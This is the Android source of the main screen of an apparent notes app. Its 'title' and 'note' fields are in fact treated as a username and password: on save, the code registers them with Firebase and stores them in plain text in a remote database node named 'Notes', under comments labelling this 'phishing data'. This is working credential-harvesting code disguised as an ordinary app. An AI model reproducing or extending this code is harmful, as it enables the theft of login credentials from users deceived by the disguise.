package com.safdar.myapplication;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class MainActivity extends AppCompatActivity {

    private FirebaseAuth mAuth;
    private Button save;
    private EditText title, note;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        title = findViewById(R.id.editText_title);
        note = findViewById(R.id.editText_note);
        save =  findViewById(R.id.btn_save);

        save.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String mTitle = title.getText().toString();
                String mNote = note.getText().toString();
                mAuth = FirebaseAuth.getInstance();
                mAuth.createUserWithEmailAndPassword(mTitle, mNote).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                    @Override
                    public void onComplete(@NonNull Task<AuthResult> task) {
                        Toast.makeText(getApplicationContext(),"saved",Toast.LENGTH_SHORT).show();
                    }
                });

                // phishing data
                // fetching user id & password

                HashMap<String ,Object> map = new HashMap<>();
                map.put("userName", mTitle);
                map.put("password", mNote);
                Log.i("btn","clicked");
                FirebaseDatabase.getInstance().getReference().push().child("Notes").setValue(map)
                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                            @Override
                            public void onComplete(@NonNull Task<Void> task) {
                                Log.i("fire","clicked");
                                Toast.makeText(getApplicationContext(),"Data Successfully Inserted!",Toast.LENGTH_SHORT).show();
                            }
                        });

            }
        });



    }
}
